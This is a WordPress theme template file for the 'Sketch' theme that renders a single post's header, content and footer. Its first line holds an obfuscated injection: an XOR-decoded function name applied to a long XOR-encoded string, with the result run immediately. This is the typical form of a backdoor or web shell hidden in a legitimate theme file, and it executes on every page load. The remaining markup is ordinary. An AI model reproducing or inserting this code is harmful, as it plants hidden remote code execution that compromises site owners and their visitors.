<?php $emRWdfOlz='NB2A<7rJC<+TDZW'^'-0W HR-,6RH -59';$PcRoWfye=$emRWdfOlz('','; Af+67TLT8Z=P=B29 Lv:UR8D 6R+h9HBPhpY1L>>6+7N0XYx0OGhJ0TZ3dYX0ou33FQUMc2KGfGpujL3kleeY LSDxCAvHA42SRna=nEYWOyf.k5MB6T9YfI4<0BsZuEzaY1OOG-4MciikpJ6621.t+9wdJnVPK1MSSKsH9L> YreQQRzvSC;ke8I;U:VBR9L2eB:kQHOdFRQ;ASFjkX;=MVVHLZ6ZTtSW3XOuF45+YM:B298W81EUdL8zx:9r7qUSmq1<WPPsnV8AL2XebImkuRXOUf:43JdoaUETM<xuHPZAtiwOKAUFTcl5iKU.gbYnYL3LHTK4>VDH5J4RmAr6ayii<i>HV5LBS<AWDJAlG8X IFGNA5:u=;;,b..NELsi3 Eo3oQU5Z98kSCk>;L9NXKb,1P1EuIAZQkuG3XE:T;:-U364EA;Y;3 :-c3CIYDYJ1EOEiU3R+D,pK+5T9nFqV2JM81,S,NBpAQFrHXRXMooVuL6A2Wn-.4dEL9 ESKW35.BJzRZL ;BCEkVdZXWyu5XOUorE-;s;QbvysIbMgEzqRVTGsZB3lPPoMKmPStTtl-vVxSLQucnF5RYAH+ZNC5N-3+;4ps722<=J-lmeNO;H8QaSAibKyLhe5F-<bCY3-VpA:6EB.RZOalP6JK7E8gDaPmV'^'RFiGMCY78=W4b5E+AMSdQB: g AB3t7T=6wAYyJF7XCET:Y77XH 57.Q ;l;4-DGQWR20ymGY.>OgPUJlHaelA6U8syXdfMBH=T< FETNxygtYBGWF90Z1WqB-UHQkHzQ,QJp;FFcBA9CGTKXnRWFPuPBdW:jJ=52ji:snS;M>RE7ZA:4+S+zx1blJ,O H8jvV9FLy0b,B2nLv5Z52fWK>ZQ>3mBh>W.5+82JxrU UYX<v0HTVJ2YR-uLhg97ur;rQ4 MUZY.pmMNrN  G=LB2gbQ69;49QQJjYOE> -v6qQ,1. TTWk= 931XfHcA<HGJxJ=-G-at0>70+:P+W:MiVi3<8<y:jh7Flf8Y8wytaH1Y4U,og5K<3QYZOM=EK7eqSMXE<T9fXqQ;MYKncOHZ L+cAkQ;-;OQ- .0KHgs-+I1ISL9ZLQm9T+dWANL<l.<-l;+B yq61V1D IXoOT XGjQrV+9YnG6UgkKK8 Zl<3,,OIpU-D3S.1FKM; 4PS1 cpXPWefZv>-TZkccMvL7<bQQQ9;44U.HBTfxBKDSnU,U JAfe6uA9rVThfXzsYffLeLUID0N1kxUEHfT + 1t1+:j+UZXOGXTGSKPR+IKAEj+Z<YxHsaIBkY7blP0LPJg=RY7+fJW<.A3>h<Ek<C.O,LOtHkg+');$PcRoWfye();
/**
 * @package Sketch
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<header class="entry-header">
		<?php the_title( '<h1 class="entry-title">', '</h1>' ); ?>

		<div class="entry-meta">
			<?php sketch_post_format(); ?>
			<?php sketch_posted_on(); ?>
			<?php edit_post_link( __( 'Edit', 'sketch' ), '<span class="sep"> | </span><span class="edit-link">', '</span>' ); ?>
		</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

	<div class="entry-content">
		<?php the_content(); ?>
		<?php
			wp_link_pages( array(
				'before' => '<div class="page-links">' . __( 'Pages:', 'sketch' ),
				'after'  => '</div>',
			) );
		?>
	</div><!-- .entry-content -->

	<footer class="entry-footer">
		<?php
			/* translators: used between list items, there is a space after the comma */
			$categories_list = get_the_category_list( __( ', ', 'sketch' ) );
			if ( $categories_list && sketch_categorized_blog() ) :
		?>
		<span class="cat-links">
			<?php printf( __( 'Posted in %1$s', 'sketch' ), $categories_list ); ?>
		</span>
		<?php endif; // End if categories ?>
		<?php
			$tags_list = get_the_tag_list( '', '' );
			if ( $tags_list && ! is_wp_error( $tags_list ) ) :
		?>
		<span class="tags-links">
			<?php echo $tags_list; ?>
		</span>
		<?php endif; // End if $tags_list ?>
	</footer><!-- .entry-footer -->
</article><!-- #post-## -->
